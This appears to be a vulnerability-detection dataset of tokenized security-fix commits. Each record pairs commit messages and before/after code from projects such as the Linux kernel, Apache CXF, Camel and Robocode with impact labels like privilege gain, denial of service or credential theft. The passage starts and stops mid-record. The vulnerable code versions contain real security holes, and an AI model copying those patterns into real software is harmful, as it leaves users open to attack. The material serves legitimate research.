"\"", ",", "securityExceptionOccurred", ")", ";", "}", "@", "Override", "protected", "int", "getExpectedErrors", "(", ")", "{", "return", "1", ";", "}", "}", "@", "@", "-", "2", ",", "7", "+", "2", ",", "7", "@", "@", "*", "Rollback", "of", "previous", "attempt", "to", "fix", "issues", "with", "the", "RobocodeEngine", ",", "which", "could", "not", "read", "robots", "in", "\"", "developer", "mode", "\"", "(", "marked", "with", "a", "asterix", "character", ")", ".", "Hence", "the", "old", "bug", "[", "Bug", "-", "398", "]", "[]", "has", "been", "reintroduced", ".</s>throw", "new", "AccessControlException", "(", "message", ")", ";", "throw", "new", "AccessControlException", "(", "message", ")", ";", "private", "boolean", "messagedAccessDenied", ";", "if", "(", "out", ".", "contains", "(", "\"", "access", "denied", "(", "java", ".", "net", ".", "SocketPermission", "\"", ")", "|", "|", "out", ".", "contains", "(", "\"", "access", "denied", "(", "\\\"", "java", ".", "net", ".", "SocketPermission", "\\", "\"\"", "))", "{", "messagedAccessDenied", "=", "true", ";", "Assert", ".", "assertTrue", "(", "\"", "HTTP", "connection", "is", "not", "allowed", "\"", ",", "messagedAccessDenied", ")", ";", "return", "hasJavaNetURLPermission", "?", "3", ":", "2", ";", "/", "/", "Security", "error", "must", "be", "reported", "as", "an", "error", "private", "boolean", "messagedAccessDenied", ";", "if", "(", "out", ".", "contains", "(", "\"", "access", "denied", "(", "java", ".", "net", ".", "SocketPermission", "\"", ")", "|", "|", "out", ".", "contains", "(", "\"", "access", "denied", "(", "\\\"", "java", ".", "net", ".", "SocketPermission", "\\", "\"\"", "))", "{", "messagedAccessDenied", "=", "true", ";", "Assert", ".", "assertTrue", "(", "\"", "HTTP", "connection", "is", "not", "allowed", "\"", ",", "messagedAccessDenied", ")", ";", "return", "hasJavaNetURLPermission", "?", "2", ":", "1", ";", "/", "/", "Security", "error", "must", "be", "reported", "as", "an", "error", ".", "Java", "8", "reports", "two", "errors", ".", "*", "Rollback", "of", "previous", "attempt", "to", "fix", "issues", "with", "the", "RobocodeEngine", ",", "which", "could", "not", "read", "robots", "in", "\"", "developer", "mode", "\"", "(", "marked", "with", "a", "asterix", "character", ")", ".", "Hence", "the", "old", "bug", "[", "Bug", "-", "398", "]", "[]", "is", "back", "."], "docstring_tokens": ["bypass", "access", "restrictions"]}
{"contents": ["Finalizing", "XmlSecInInterceptor", "updates"], "code_tokens": ["import", "javax", ".", "ws", ".", "rs", ".", "WebApplicationException", ";", "import", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "ReaderInterceptor", ";", "import", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "ReaderInterceptorContext", ";", "import", "org", ".", "apache", ".", "cxf", ".", "message", ".", "MessageUtils", ";", "public", "class", "XmlSecInInterceptor", "extends", "AbstractPhaseInterceptor", "<", "Message", ">", "implements", "ReaderInterceptor", "{", "if", "(", "isServerGet", "(", "message", ")", ")", "{", "prepareMessage", "(", "message", ")", ";", "message", ".", "getInterceptorChain", "(", ").", "add", "(", "new", "StaxActionInInterceptor", "(", "requireSignature", ",", "requireEncryption", ")", ");", "}", "private", "void", "prepareMessage", "(", "Message", "inMsg", ")", "throws", "Fault", "{", "private", "boolean", "isServerGet", "(", "Message", "message", ")", "{", "String", "method", "=", "(", "String", ")", "message", ".", "get", "(", "Message", ".", "HTTP_REQUEST_METHOD", ")", ";", "return", "\"", "GET", "\"", ".", "equals", "(", "method", ")", "&", "&", "!", "MessageUtils", ".", "isRequestor", "(", "message", ")", ";", "@", "Override", "public", "Object", "aroundReadFrom", "(", "ReaderInterceptorContext", "ctx", ")", "throws", "IOException", ",", "WebApplicationException", "{", "Message", "message", "=", "JAXRSUtils", ".", "getCurrentMessage", "(", ");", "if", "(", "isServerGet", "(", "message", ")", ")", "{", "return", "ctx", ".", "proceed", "(", ");", "}", "else", "{", "prepareMessage", "(", "message", ")", ";", "Object", "object", "=", "ctx", ".", "proceed", "(", ");", "new", "StaxActionInInterceptor", "(", "requireSignature", ",", "requireEncryption", ")", ".", "handleMessage", "(", "message", ")", ";", "return", "object", ";", "}", "}", "private", "static", "class", "StaxActionInInterceptor", "extends", "AbstractPhaseInterceptor", "<", "Message", ">", "{</s>/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "*", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "*", "distributed", "with", "this", "work", "for", "additional", "information", "*", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "*", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "*", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "*", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "*", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "*", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "*", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "*", "specific", "language", "governing", "permissions", "and", "limitations", "*", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "xml", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "javax", ".", "ws", ".", "rs", ".", "WebApplicationException", ";", "import", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "ReaderInterceptor", ";", "import", "javax", ".", "ws", ".", "rs", ".", "ext", ".", "ReaderInterceptorContext", ";", "import", "org", ".", "apache", ".", "cxf", ".", "jaxrs", ".", "utils", ".", "JAXRSUtils", ";", "import", "org", ".", "apache", ".", "cxf", ".", "message", ".", "Message", ";", "public", "class", "ClientXmlSecInInterceptor", "extends", "XmlSecInInterceptor", "implements", "ReaderInterceptor", "{", "@", "Override", "public", "Object", "aroundReadFrom", "(", "ReaderInterceptorContext", "ctx", ")", "throws", "IOException", ",", "WebApplicationException", "{", "Message", "message", "=", "JAXRSUtils", ".", "getCurrentMessage", "(", ");", "handleMessage", "(", "message", ")", ";", "Object", "object", "=", "ctx", ".", "proceed", "(", ");", "new", "StaxActionInInterceptor", "(", "super", ".", "isRequireSignature", "(", "),", "super", ".", "isRequireEncryption", "(", "))", ".", "handleMessage", "(", "message", ")", ";", "return", "object", ";", "}", "@", "Override", "protected", "void", "registerStaxActionInInterceptor", "(", "Message", "inMsg", ")", "{", "/", "/", "complete", "}", "}", "@", "@", "-", "34", ",", "7", "+", "34", ",", "10", "@", "@", "public", "class", "XmlSecInInterceptor", "extends", "AbstractPhaseInterceptor", "<", "Message", ">", "{", "String", "method", "=", "(", "String", ")", "message", ".", "get", "(", "Message", ".", "HTTP_REQUEST_METHOD", ")", ";", "if", "(", "\"", "GET", "\"", ".", "equals", "(", "method", ")", ")", "{", "Message", "outMs", "=", "message", ".", "getExchange", "(", ").", "getOutMessage", "(", ");", "Message", "inMsg", "=", "outMs", "=", "=", "null", "?", "message", ":", "outMs", ".", "getExchange", "(", ").", "getInMessage", "(", ");", "registerStaxActionInInterceptor", "(", "inMsg", ")", ";", "protected", "void", "registerStaxActionInInterceptor", "(", "Message", "inMsg", ")", "{", "inMsg", ".", "getInterceptorChain", "(", ").", "add", "(", "new", "StaxActionInInterceptor", "(", "requireSignature", ",", "requireEncryption", ")", ");", "protected", "static", "class", "StaxActionInInterceptor", "extends", "AbstractPhaseInterceptor", "<", "Message", ">", "{"], "docstring_tokens": ["spoof", "the", "servers"]}
{"contents": ["catc:", "Use", "heap", "buffer", "for", "memory", "size", "test", "Allocating", "USB", "buffers", "on", "the", "stack", "is", "not", "portable,", "and", "no", "longer", "works", "on", "x86_64", "(with", "VMAP_STACK", "enabled", "as", "per", "default).", "Fixes:", "1da177e4c3f4", "(\"Linux-2.6.12-rc2\")", "Signed-off-by:", "Ben", "Hutchings", "<ben@decadent.org.uk>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["int", "pktsz", ",", "ret", ";", "u32", "*", "buf", ";", "int", "i", ";", "buf", "=", "kmalloc", "(", "4", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "buf", ")", "{", "ret", "=", "-", "ENOMEM", ";", "goto", "fail_free", ";", "}", "*", "buf", "=", "0x12345678", ";", "catc_write_mem", "(", "catc", ",", "0x7a80", ",", "buf", ",", "4", ")", ";", "*", "buf", "=", "0x87654321", ";", "catc_write_mem", "(", "catc", ",", "0xfa80", ",", "buf", ",", "4", ")", ";", "catc_read_mem", "(", "catc", ",", "0x7a80", ",", "buf", ",", "4", ")", ";", "switch", "(", "*", "buf", ")", "{", "kfree", "(", "buf", ")", ";</s>int", "i", ",", "pktsz", ",", "ret", ";", "i", "=", "0x12345678", ";", "catc_write_mem", "(", "catc", ",", "0x7a80", ",", "&", "i", ",", "4", ")", ";", "i", "=", "0x87654321", ";", "catc_write_mem", "(", "catc", ",", "0xfa80", ",", "&", "i", ",", "4", ")", ";", "catc_read_mem", "(", "catc", ",", "0x7a80", ",", "&", "i", ",", "4", ")", ";", "switch", "(", "i", ")", "{"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(system", "crash", "or", "memory", "corruption", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["untangling", "do_mremap(),", "part", "1", "Take", "locating", "vma", "and", "checks", "on", "it", "to", "a", "separate", "helper", "(it", "will", "be", "shared", "between", "MREMAP_FIXED/non-MREMAP_FIXED", "cases", "when", "we", "split", "them", "in", "the", "next", "patch)", "Acked-by:", "Russell", "King", "<rmk+kernel@arm.linux.org.uk>", "Acked-by:", "Hugh", "Dickins", "<hugh.dickins@tiscali.co.uk>", "Signed-off-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>"], "code_tokens": ["static", "struct", "vm_area_struct", "*", "vma_to_resize", "(", "unsigned", "long", "addr", ",", "unsigned", "long", "old_len", ",", "unsigned", "long", "new_len", ",", "unsigned", "long", "*", "p", ")", "{", "struct", "mm_struct", "*", "mm", "=", "current", "-", ">", "mm", ";", "struct", "vm_area_struct", "*", "vma", "=", "find_vma", "(", "mm", ",", "addr", ")", ";", "if", "(", "!", "vma", "|", "|", "vma", "-", ">", "vm_start", ">", "addr", ")", "goto", "Efault", ";", "if", "(", "is_vm_hugetlb_page", "(", "vma", ")", ")", "goto", "Einval", ";", "/", "*", "We", "can", "'", "t", "remap", "across", "vm", "area", "boundaries", "*", "/", "if", "(", "old_len", ">", "vma", "-", ">", "vm_end", "-", "addr", ")", "goto", "Efault", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "(", "VM_DONTEXPAND", "|", "VM_PFNMAP", ")", ")", "{", "if", "(", "new_len", ">", "old_len", ")", "goto", "Efault", ";", "}", "if", "(", "vma", "-", ">", "vm_flags", "&", "VM_LOCKED", ")", "{", "unsigned", "long", "locked", ",", "lock_limit", ";", "locked", "=", "mm", "-", ">", "locked_vm", "<", "<", "PAGE_SHIFT", ";", "lock_limit", "=", "current", "-", ">", "signal", "-", ">", "rlim", "[", "RLIMIT_MEMLOCK", "]", ".", "rlim_cur", ";", "locked", "+", "=", "new_len", "-", "old_len", ";", "if", "(", "locked", ">", "lock_limit", "&", "&", "!", "capable", "(", "CAP_IPC_LOCK", ")", ")", "goto", "Eagain", ";", "}", "if", "(", "!", "may_expand_vm", "(", "mm", ",", "(", "new_len", "-", "old_len", ")", ">", ">", "PAGE_SHIFT", ")", ")", "goto", "Enomem", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "VM_ACCOUNT", ")", "{", "unsigned", "long", "charged", "=", "(", "new_len", "-", "old_len", ")", ">", ">", "PAGE_SHIFT", ";", "if", "(", "security_vm_enough_memory", "(", "charged", ")", ")", "goto", "Efault", ";", "*", "p", "=", "charged", ";", "}", "return", "vma", ";", "Efault", ":", "/", "*", "very", "odd", "choice", "for", "most", "of", "the", "cases", ",", "but", ".", "..", "*", "/", "return", "ERR_PTR", "(", "-", "EFAULT", ")", ";", "Einval", ":", "return", "ERR_PTR", "(", "-", "EINVAL", ")", ";", "Enomem", ":", "return", "ERR_PTR", "(", "-", "ENOMEM", ")", ";", "Eagain", ":", "return", "ERR_PTR", "(", "-", "EAGAIN", ")", ";", "}", "vma", "=", "vma_to_resize", "(", "addr", ",", "old_len", ",", "new_len", ",", "&", "charged", ")", ";", "if", "(", "IS_ERR", "(", "vma", ")", ")", "{", "ret", "=", "PTR_ERR", "(", "vma", ")", ";</s>ret", "=", "-", "EFAULT", ";", "vma", "=", "find_vma", "(", "mm", ",", "addr", ")", ";", "if", "(", "!", "vma", "|", "|", "vma", "-", ">", "vm_start", ">", "addr", ")", "goto", "out", ";", "if", "(", "is_vm_hugetlb_page", "(", "vma", ")", ")", "{", "ret", "=", "-", "EINVAL", ";", "goto", "out", ";", "}", "/", "*", "We", "can", "'", "t", "remap", "across", "vm", "area", "boundaries", "*", "/", "if", "(", "old_len", ">", "vma", "-", ">", "vm_end", "-", "addr", ")", "goto", "out", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "(", "VM_DONTEXPAND", "|", "VM_PFNMAP", ")", ")", "{", "if", "(", "new_len", ">", "old_len", ")", "goto", "out", ";", "}", "if", "(", "vma", "-", ">", "vm_flags", "&", "VM_LOCKED", ")", "{", "unsigned", "long", "locked", ",", "lock_limit", ";", "locked", "=", "mm", "-", ">", "locked_vm", "<", "<", "PAGE_SHIFT", ";", "lock_limit", "=", "current", "-", ">", "signal", "-", ">", "rlim", "[", "RLIMIT_MEMLOCK", "]", ".", "rlim_cur", ";", "locked", "+", "=", "new_len", "-", "old_len", ";", "ret", "=", "-", "EAGAIN", ";", "if", "(", "locked", ">", "lock_limit", "&", "&", "!", "capable", "(", "CAP_IPC_LOCK", ")", ")", "goto", "out", ";", "}", "if", "(", "!", "may_expand_vm", "(", "mm", ",", "(", "new_len", "-", "old_len", ")", ">", ">", "PAGE_SHIFT", ")", ")", "{", "ret", "=", "-", "ENOMEM", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "VM_ACCOUNT", ")", "{", "charged", "=", "(", "new_len", "-", "old_len", ")", ">", ">", "PAGE_SHIFT", ";", "if", "(", "security_vm_enough_memory", "(", "charged", ")", ")", "goto", "out_nc", ";", "}", "out_nc", ":"], "docstring_tokens": ["gain", "privileges", "or", "cause", "a", "denial", "of", "service", "(panic", ")"]}
{"contents": ["CAMEL-13042:", "Polished"], "code_tokens": ["</s>import", "org", ".", "apache", ".", "camel", ".", "CamelExchangeException", ";"], "docstring_tokens": ["view", "arbitrary", "files", "on", "the", "system"]}
{"contents": ["ALSA:", "pcm:", "prevent", "UAF", "in", "snd_pcm_info", "When", "the", "device", "descriptor", "is", "closed,", "the", "`substream->runtime`", "pointer", "is", "freed.", "But", "another", "thread", "may", "be", "in", "the", "ioctl", "handler,", "case", "SNDRV_CTL_IOCTL_PCM_INFO.", "This", "case", "calls", "snd_pcm_info_user()", "which", "calls", "snd_pcm_info()", "which", "accesses", "the", "now", "freed", "`substream->runtime`.", "Note:", "this", "fixes", "Signed-off-by:", "Robb", "Glasser", "<rglasser@google.com>", "Signed-off-by:", "Nick", "Desaulniers", "<ndesaulniers@google.com>", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["mutex_lock", "(", "&", "pcm", "-", ">", "open_mutex", ")", ";", "mutex_unlock", "(", "&", "pcm", "-", ">", "open_mutex", ")", ";</s>"], "docstring_tokens": ["gain", "elevated", "privileges", "on", "the", "system"]}
{"contents": ["gre:", "fix", "netns", "vs", "proto", "registration", "ordering", "GRE", "protocol", "receive", "hook", "can", "be", "called", "right", "after", "protocol", "addition", "is", "done.", "If", "netns", "stuff", "is", "not", "yet", "initialized,", "we're", "going", "to", "oops", "in", "net_generic().", "This", "is", "remotely", "oopsable", "if", "ip_gre", "is", "compiled", "as", "module", "and", "packet", "comes", "at", "unfortunate", "moment", "of", "module", "loading.", "Signed-off-by:", "Alexey", "Dobriyan", "<adobriyan@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["return", "err", ";", "err", "=", "inet_add_protocol", "(", "&", "ipgre_protocol", ",", "IPPROTO_GRE", ")", ";", "if", "(", "err", "<", "0", ")", "{", "printk", "(", "KERN_INFO", "\"", "ipgre", "init", ":", "can", "'", "t", "add", "protocol", "\\", "n", "\"", ");", "goto", "add_proto_failed", ";", "}", "add_proto_failed", ":", "unregister_pernet_device", "(", "&", "ipgre_net_ops", ")", ";", "unregister_pernet_device", "(", "&", "ipgre_net_ops", ")", ";</s>if", "(", "inet_add_protocol", "(", "&", "ipgre_protocol", ",", "IPPROTO_GRE", ")", "<", "0", ")", "{", "printk", "(", "KERN_INFO", "\"", "ipgre", "init", ":", "can", "'", "t", "add", "protocol", "\\", "n", "\"", ");", "return", "-", "EAGAIN", ";", "}", "goto", "gen_device_failed", ";", "unregister_pernet_device", "(", "&", "ipgre_net_ops", ")", ";", "gen_device_failed", ":", "unregister_pernet_device", "(", "&", "ipgre_net_ops", ")", ";"], "docstring_tokens": ["the", "kernel", "to", "panic"]}
{"contents": ["Added", "validation", "of", "input", "color", "codes"], "code_tokens": ["/", "/", "https", ":", "//", "stackoverflow", ".", "com", "/", "questions", "/", "8027423", "/", "how", "-", "to", "-", "check", "-", "if", "-", "a", "-", "string", "-", "is", "-", "a", "-", "valid", "-", "hex", "-", "color", "-", "representation", "/", "8027444", "var", "colorValid", "=", "/", "(^", "#?", "[", "0", "-", "9A", "-", "F", "]", "{", "6", "}", "$)", "|(", "^#", "[", "0", "-", "9A", "-", "F", "]", "{", "3", "}", "$)", "/", "i", ".", "test", "(", "color", ")", ";", "if", "(", "colorValid", ")", "ColorDialog", ".", "addRecentColor", "(", "color", ",", "12", ")", ";", "if", "(", "color", "!", "=", "'", "none", "'", "&", "&", "color", ".", "charAt", "(", "0", ")", "!", "=", "'", "#'", ")", "{", "color", "=", "'", "#'", "+", "color", ";", "}", "applyFunction", "(", "color", ")", ";</s>ColorDialog", ".", "addRecentColor", "(", "color", ",", "12", ")", ";", "if", "(", "color", "!", "=", "'", "none", "'", "&", "&", "color", ".", "charAt", "(", "0", ")", "!", "=", "'", "#'", ")", "color", "=", "'", "#'", "+", "color", ";", "applyFunction", "(", "color", ")", ";"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["Adding", "some", "audience", "restriction", "tests"], "code_tokens": ["return", "Collections", ".", "emptyList", "(", ");", "if", "(", "!", "validateAudienceRestrictions", "(", "federationResponse", ".", "getAudience", "(", "),", "request", ".", "getRequestURL", "(", ").", "toString", "(", "))", ")", "{", "return", "null", ";", "}", "/", "/", "validate", "against", "the", "configured", "list", "of", "audienceURIs", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "*", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "*", "distributed", "with", "this", "work", "for", "additional", "information", "*", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "*", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "*", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "*", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "*", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "*", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "*", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "*", "specific", "language", "governing", "permissions", "and", "limitations", "*", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "federation", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "CallbackHandler", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "UnsupportedCallbackException", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Element", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "common", ".", "STSUtil", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "common", ".", "SecurityTestUtil", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "FederationConstants", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "KeystoreCallbackHandler", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "SAML2CallbackHandler", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "config", ".", "FedizConfigurator", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "config", ".", "FedizContext", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "crypto", ".", "Crypto", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "crypto", ".", "CryptoFactory", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "ext", ".", "WSPasswordCallback", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "ext", ".", "WSSecurityException", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "SAMLCallback", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "SAMLUtil", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "SamlAssertionWrapper", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "bean", ".", "AudienceRestrictionBean", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "bean", ".", "ConditionsBean", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "saml", ".", "builder", ".", "SAML2Constants", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "util", ".", "DOM2Writer", ";", "import", "org", ".", "apache", ".", "wss4j", ".", "common", ".", "util", ".", "XMLUtils", ";", "import", "org", ".", "easymock", ".", "EasyMock", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "/", "**", "*", "Some", "tests", "for", "audience", "restriction", "*", "/", "public", "class", "AudienceRestrictionTest", "{", "public", "static", "final", "String", "SAMPLE_MULTIPLE_RSTR_COLL_MSG", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "encoding", "=", "\\\"", "UTF", "-", "8", "\\", "\"?", ">\"", "+", "\"", "<", "RequestSecurityTokenResponseCollection", "\"", "+", "\"", "xmlns", "=", "\\\"", "http", ":", "//", "docs", ".", "oasis", "-", "open", ".", "org", "/", "ws", "-", "sx", "/", "ws", "-", "trust", "/", "200512", "\\", "\">", "\"", "+", "\"", "<", "RequestSecurityTokenResponse", ">", "\"", "+", "\"", "<", "RequestedSecurityToken", ">", "\"", "+", "\"", "</", "RequestedSecurityToken", ">", "\"", "+", "\"", "</", "RequestSecurityTokenResponse", ">", "\"", "+", "\"", "<", "RequestSecurityTokenResponse", ">", "\"", "+", "\"", "<", "RequestedSecurityToken", ">", "\"", "+", "\"", "</", "RequestedSecurityToken", ">", "\"", "+", "\"", "</", "RequestSecurityTokenResponse", ">", "\"", "+", "\"", "</", "RequestSecurityTokenResponseCollection", ">", "\";", "static", "final", "String", "TEST_USER", "=", "\"", "alice", "\"", ";", "static", "final", "String", "TEST_RSTR_ISSUER", "=", "\"", "FedizSTSIssuer", "\"", ";", "static", "final", "String", "TEST_AUDIENCE", "=", "\"", "https", ":", "//", "localhost", "/", "fedizhelloworld", "\"", ";", "static", "final", "String", "TEST_REQUEST_URL", "=", "\"", "https", ":", "//", "localhost", "/", "fedizhelloworld", "/", "\";", "static", "final", "String", "TEST_REQUEST_URI", "=", "\"", "/", "fedizhelloworld", "\"", ";", "private", "static", "final", "String", "CONFIG_FILE", "=", "\"", "fediz_test_config_aud", ".", "xml", "\"", ";", "private", "static", "Crypto", "crypto", ";", "private", "static", "CallbackHandler", "cbPasswordHandler", ";", "private", "static", "FedizConfigurator", "configurator", ";", "@", "BeforeClass", "public", "static", "void", "init", "(", ")", "{", "try", "{", "crypto", "=", "CryptoFactory", ".", "getInstance", "(", "\"", "signature", ".", "properties", "\"", ");", "cbPasswordHandler", "=", "new", "KeystoreCallbackHandler", "(", ");", "getFederationConfigurator", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "Assert", ".", "assertNotNull", "(", "configurator", ")", ";", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "SecurityTestUtil", ".", "cleanup", "(", ");", "}", "private", "static", "FedizConfigurator", "getFederationConfigurator", "(", ")", "{", "if", "(", "configurator", "!", "=", "null", ")", "{", "return", "configurator", ";", "}", "try", "{", "configurator", "=", "new", "FedizConfigurator", "(", ");", "final", "URL", "resource", "=", "Thread", ".", "currentThread", "(", ").", "getContextClassLoader", "(", ")", ".", "getResource", "(", "CONFIG_FILE", ")", ";", "File", "f", "=", "new", "File", "(", "resource", ".", "toURI", "(", "))", ";", "configurator", ".", "loadConfig", "(", "f", ")", ";", "return", "configurator", ";", "}", "catch", "(", "Exception", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "return", "null", ";", "}", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateAudienceThatIsRequired", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "AudienceRestrictionBean", "audienceRestriction", "=", "new", "AudienceRestrictionBean", "(", ");", "audienceRestriction", ".", "getAudienceURIs", "(", ").", "add", "(", "TEST_AUDIENCE", ")", ";", "cp", ".", "setAudienceRestrictions", "(", "Collections", ".", "singletonList", "(", "audienceRestriction", ")", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "AUD1", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", 